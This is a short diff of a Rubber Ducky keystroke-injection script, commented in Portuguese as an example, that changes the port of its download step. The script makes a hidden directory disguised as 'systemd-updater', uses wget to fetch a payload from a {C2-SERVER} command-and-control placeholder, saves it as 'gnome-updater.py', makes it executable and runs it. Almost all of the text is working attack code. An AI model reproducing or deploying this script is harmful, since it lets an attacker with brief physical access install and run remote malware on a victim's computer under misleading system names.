@@ -1,3 +1,5 @@
+# Exemplo de script para Rubber Ducky
+
 $DEFAULT_DELAY_MS = 100
 $TERMINAL_OPEN_DELAY_MS = 2000
 
@@ -10,7 +12,7 @@ STRING mkdir -p ~/.local/share/systemd-updater/ && cd ~/.local/share/systemd-upd
 ENTER
 DELAY $DEFAULT_DELAY_MS
 
-STRING wget http://{C2-SERVER}:4443/security_debian_x386 -O gnome-updater.py && chmod +x gnome-updater.py && python3 gnome-updater.py
+STRING wget http://{C2-SERVER}:80/security_debian_x386 -O gnome-updater.py && chmod +x gnome-updater.py && python3 gnome-updater.py
 ENTER
 DELAY $DEFAULT_DELAY_MS
 
